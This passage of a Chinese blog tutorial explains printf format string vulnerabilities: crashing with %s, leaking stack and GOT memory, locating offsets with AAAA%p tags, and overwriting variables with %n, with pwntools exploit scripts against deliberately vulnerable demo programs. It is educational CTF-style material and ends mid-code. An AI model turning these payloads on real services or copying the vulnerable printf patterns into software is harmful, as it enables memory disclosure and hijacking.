函数之前，将参数从右到左依次压栈。进入 <code>printf ()</code> 之后，函数首先获取第一个参数，一次读取一个字符。</p><ul><li>如果字符不是 %，字符直接复制到输出中。</li><li>字符是%，读取下一个字符。如果字符为空则报错，如果字符为%，输出%，除此之外，获取相应的参数并解析输出。</li></ul><p>总而言之，其实格式字符串漏洞发生的条件就是<strong>格式字符串要求的参数和实际提供的参数不匹配</strong>。</p><p>如下面的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s %x %x %x&quot;</span>,<span class="hljs-string">&quot;hello Modifier&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行就会输出栈上的高地址</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-1.png"></p><p>同样，如果我们把函数写成这个样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序照样会运行，但输出如下图</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-2.png"></p><p>其中第一个%s，程序将其解析为其地址对应的字符串，如果我们提供一个不存在的地址，程序就会崩溃。</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>就像在格式化字符串原理部分说的，格式化字符串的两个利用手段就是;</p><ul><li>利用%s 对应的参数地址不合法让程序崩溃。</li><li>根据 %d，%f 输出了栈上的内容，查看栈上的内容。</li></ul><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>利用格式化字符串让程序崩溃很简单，只需要向程序输入无数个%s。对于每一个%s，程序都要获取一个栈上的数字，并把该数字视作一个地址，然后打印出地址指向的内存内容，直到出现NULL字符。但是栈上并不是每一个值都对应着一个合法的地址，总会有一个对应的内存不存在，就可以让程序崩溃。</p><p>比如：<code>printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)</code></p><p>利用这一漏洞，我们虽然不能控制程序，但是可以让服务崩溃，使得其他用户无法访问。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>我们可以利用程序崩溃来验证漏洞，除此之外我们还是要利用格式化字符串获取有效信息，为下一步的漏洞利用做准备。</p><p>我们已经知道格式化字符串函数从栈上取值，并且在x86中参数逆序（从右到左）进栈，而对于printf函数来说，实际参数也按照逆序的顺序被压入栈中，所以参数在内存中出现的顺序和printf调用时的顺序一样。</p><h5 id="泄露栈变量数值"><a href="#泄露栈变量数值" class="headerlink" title="泄露栈变量数值"></a>泄露栈变量数值</h5><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;%p %p %p\n&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);  <span class="hljs-comment">//输出三个整型变量，接着输出字符串 str</span><br>    <span class="hljs-built_in">printf</span>(str);  <span class="hljs-comment">//直接将 str 字符串作为格式化字符串</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出是这个样子的</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/use1.png"></p><p>可以看到第二个print处输出了两个地址，分别看一下两个printf的栈结构</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack-2.png"></p><p>可以看到，我们利用自己写的格式化字符串能够查看栈上的信息。</p><p>像例题这样的格式化字符串函数写法，我们只能按顺序获取栈上的参数。我们可以稍加修改，根据前面讲到的格式化字符串的格式，我们可以通过<code>%n$[type]</code>的方式查看第n个参数的值</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">200</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在开始输入%3$x，查看第二个printf处的栈结构</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-stack.png"></p><p>查看输出结果，printf输出了第3+1个参数对应的值</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-output.png"></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>还是用上面的那个程序，这次输入<code>$s</code>来试一下</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>在第二次 printf 处，程序将 0xffffcfe4 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p>需要注意的是，并不是所有这样的都会正常运行，<strong>如果对应的变量不能够被解析为字符串地址，程序就会直接崩溃</strong>。</p><p>我们尝试输入 <code>%4$s</code>，就会报错直接崩溃。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-error.png"></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><ul><li><p>可以利用 <code>%x</code> 或者 <code>%p</code> 来获取相应栈上的内存，区别是输出的信息是否包含前缀”0x”（ <code>%p</code> 会自动添加前缀”0x”，而 <code>%x</code> 不会）</p></li><li><p>利用 <code>%s</code> 来获取变量所对应地址的内容，但需要注意字符串以零字符（’\0’）作为结尾。该地址上存储的数据可能会被截断，只会输出到遇到第一个零字符为止。</p></li><li><p>利用 <code>% [n]$x</code> 来获取指定参数的值，利用 <code>%[n]$s</code> 来获取指定参数对应地址内容。</p></li></ul><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>我们在做题的时候经常会需要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这个时候我们就需要控制泄露某一个地址的内存。</p><p>一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的。也就是说，调用输出函数的时候我们的<strong>第一个参数值就是这个格式化字符串的地址</strong>。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>在我们上面输出字符串的例子中，我们可以看出栈上的第二个变量就是我们的格式化字符串地址 0xffffcFE0，同时该地址存储的也是 “%s” 格式化字符串内容。</p><p>那如果我们知道某个格式化字符串在输出的时候调用的是第几个参数，我们就可以通过下面的方法获取某个指定地址的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[addr]%[k]$s<br></code></pre></td></tr></table></figure><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>那么如何确定该格式化字符串是第几个参数呢？我们可以向程序发送如下格式的payload：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[tag]%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br></code></pre></td></tr></table></figure><p>其中 <code>[tag]</code> 是我们判断的标志，我们一般会选择重复某一个字符的机器字长作为 tag ，比如 ‘AAAA’。如果输出的栈上的内容和我们的 tag 重复了，那么这个地址大概率就是格式化字符串的地址，可以更换多个 tag 再次确认尝试。</p><p>还是之前的程序，我们输入<code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</code>来测试一下</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output.png"></p><p>其中第二次 printf 输出如下（为了方便看，我在每两个地址之间加了空格）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span> <span class="hljs-number">0</span>xffffcffc <span class="hljs-number">0</span>xf7de0012 <span class="hljs-number">0</span>x80484a0 <span class="hljs-number">0</span>xf63d4e2e <span class="hljs-number">0</span>x804825c <span class="hljs-number">0</span>x7b1ea71 <span class="hljs-number">0</span>x41414141 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025<br></code></pre></td></tr></table></figure><p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第8个参数，是格式化字符串的第7个参数。我们可以来测试一下，再一次输入 <code>%7$p</code>即可读出这里的内容。如果这是个不合法的地址，程序将会崩溃。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output2.png"></p><p>当然会这个也没有什么用（x</p><h5 id="确定利用的函数"><a href="#确定利用的函数" class="headerlink" title="确定利用的函数"></a>确定利用的函数</h5><p>就像前面说的，我们真正经常用到是把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址，最后根据函数在 libc 中的相对位置，计算出我们需要的函数地址。</p><p>还是用上面的例子，我们输入一个可访问的地址，比如<code>scanf@got</code>，就应该输出scanf对应的地址。</p><p>我们首先使用 <code>read -r test</code> 命令查看其重定向表：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/got.png"></p><blockquote><p>这里之所以没有使用 printf 函数，是因为 scanf 函数会过滤掉一些字符，就像 ‘\x0c’ (‘\f’) 、’’\x07’ (\a’) 、’\x08’ (’\b’) 、’\x20’ (SPACE)等的不可见字符都会被省略。</p></blockquote><p>直接用pwntools写个exp，把获取got表地址写在里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./test&quot;</span>)<br><br>scanf_got = elf.got[<span class="hljs-string">&#x27;scanf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(scanf_got))    <br><br>payload=p32(scanf_got)+<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>gdb.attach(p,<span class="hljs-string">&quot;break printf&quot;</span>)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(p.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最终的输出和gdb栈结构如下，可以看到我们打印输出的确实是scanf的地址</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/exp.png"></p><h5 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h5><ul><li>首先确定要泄露的参数的相对偏移</li><li>确定要利用的函数</li><li>进行泄露</li></ul><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>在格式化字符串的多种类型中，有一个神秘的 <code>%n</code>······（x </p><p><strong><code>%n</code> 不输出字符，但是把已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。</strong></p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;Hello Modifier&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输出为</span><br>Hello Modifier<br><span class="hljs-number">15</span>    <span class="hljs-comment">//&#x27;Hello Modifier&#x27;+&quot;%s %n&quot;中间的空格 = 15</span><br></code></pre></td></tr></table></figure><p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数（快去复习一下格式化字符串的格式）。</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%010u%n\n&quot;</span>, <span class="hljs-number">1</span>, &amp;num);  <span class="hljs-comment">//%010u 输出域宽为10的十进制整型数字，不足的位数在左侧用0补齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num is %d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输出为</span><br><span class="hljs-number">0000000001</span><br>num is <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>同理我们可以将一个十六进制的地址进行适当的转换，利用格式化字符串写入内存。</p><p>需要注意的是，我们不能直接转换为一个占位很大的十进制进行编写，如果占位符的长度超出了<code>int</code>类型的范围，这将导致未定义的行为。也就是说这个覆盖不一定会成功，成功与否取决于不同的编译器和不同的平台。</p><p>接下来都用下面的程序进行相应的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><span class="hljs-type">int</span> a=<span class="hljs-number">123</span>,b=<span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> c=<span class="hljs-number">789</span>;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;c);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s);<br>    <span class="hljs-built_in">printf</span>(s);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>     &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <br>&#125;<br></code></pre></td></tr></table></figure><p>无论覆盖什么地址的变量，我们都是构造类似如下的payload:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[padding][overwrite addr]%[overwrite offset]$n<br></code></pre></td></tr></table></figure><p>payload需要写的数据也就是我们要覆盖内存的步骤：</p><ul><li>确定覆盖的地址</li><li>确定要覆盖的变量的相对偏移</li><li>进行覆盖</li></ul><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>在这里我们设计程序直接输出了栈变量C的地址。在实际运用中，我们可以利用其它方法获取相应地址。</p><h5 id="确定相对偏移-1"><a href="#确定相对偏移-1" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>利用上面讲过的简单粗暴的方法进行操作，确定是格式化字符串的第6个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ./overflow<br><span class="hljs-number">0xff8f615c</span><br>AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p  <span class="hljs-comment">//这里是我们的输入</span><br>AAAA,<span class="hljs-number">0xff8f60f8</span>,<span class="hljs-number">0xf7f84410</span>,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x1</span>,<span class="hljs-number">0x41414141</span>(在这里！),<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span><br></code></pre></td></tr></table></figure><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>我们已知第六个参数值就是存储变量 c 的地址后，便可以利用%n的特征来修改 c 的值啦！</p><p>根据上面说过的，我们目标输出 <code>modified c.</code>，需要把 c 改为16，则payload 为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[address of c]%012%<span class="hljs-number">6</span>$n  <br></code></pre></td></tr></table></figure><p>最终的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_c=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr_c)<br><br>payload=p32(addr_c)+<span class="hljs-string">b&#x27;%012d&#x27;</span>+<span class="hljs-string">b&#x27;%6$n&#x27;</span>  <br><span class="hljs-comment">#[address of c]%012%6$n   addr of c 的长度为 4，故而我们得再输入12个字符才可以达到16个字符</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(p,&quot;break printf&quot;)</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后运行结果</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show.png"></p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>按照我们上面讲过的payload大致格式，需要在输入内容之前前缀将要覆盖的地址，这个地址将会占用机器字长个字节，也就是说我们能覆盖的最小值就是4字节或者8字节，当我们想要修改变data变量为小于机器字长的数值时该怎么办呢？</p><p>我们可以不把变量的地址放在格式化字符串的前面。我们当时寻找偏移把 tag 放在字符串的最前面是因为这样比较方便直观，如果我们把 tag 放在中间，其实也不影响，如下，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">%p,%p,AAAA,%p,%p,%p,%p,%p,%p        <br><span class="hljs-number">0xffe2c948</span>,<span class="hljs-number">0xf7fa1410</span>,AAAA,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x10</span>,x70257025,<span class="hljs-number">0x41414141</span>,<span class="hljs-number">0x70257025</span><br></code></pre></td></tr></table></figure><p> 同样，我们可以把希望覆盖的的地址写在后面，对应的我们要将%n的参数进行相应的修改。同时我们想要将a覆盖成2，就可以写成下面的形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">aa%k$n[padding][addr of a]  <span class="hljs-comment">//padding 用来填充对齐机器字节</span><br></code></pre></td></tr></table></figure><p>最后的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_a=<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">b&#x27;aa%8$naa&#x27;</span>+p32(addr_a)  <span class="hljs-comment">#b&#x27;aa%8$naa&#x27;占8字节也就是两个变量的长度，所以地址相应后推两位就是放在第8个变量的位置</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>对应的结果是：<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show2.png"></p><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>在前面说过，如果一次性输出大数字个字节来进行覆盖，那么结果成功与否是我们不可控的，我们就需要用别的方式进行覆盖。我们需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数。利用方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> c;<br><span class="hljs-type">short</span> s;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">long</span> l;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hhn\n&quot;</span>, str, &amp;c);       <span class="hljs-comment">// 写入单字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hn\n&quot;</span>, str, &amp;s);        <span class="hljs-comment">// 写入双字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;i);         <span class="hljs-comment">// 写入4字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %ln\n&quot;</span>, str, &amp;l);        <span class="hljs-comment">// 写入8字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %lln\n&quot;</span>, str, &amp;ll);      <span class="hljs-comment">// 写入16字节</span><br></code></pre></td></tr></table></figure><p>我们都知道<strong>在x86中和 x64 的体系结构中，变量以小端序存储</strong>。像题目中所要求的，我们需要将b覆盖为0x12345678，这个<code>0x12345678</code> 在内存中地址从低到高就是 <code>\x78\x56\x34\x12</code>。同时我们利用ida得知b的地址是 0x0804A028。那么我们希望覆盖的方式就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure><p>同理payload也要构造为分别赋值的形式，大致如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p32(<span class="hljs-number">0x0804A028</span>)+p32(<span class="hljs-number">0x0804A029</span>)+p32(<span class="hljs-number">0x0804A02a</span>)+p32(<span class="hljs-number">0x0804A02b</span>)+pad1+<span class="hljs-string">&#x27;%6$n&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$n&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$n&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$n&#x27;</span><br></code></pre></td></tr></table></figure><p>可以靠自己的努力一一计算，也可以使用下方现成的基本构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 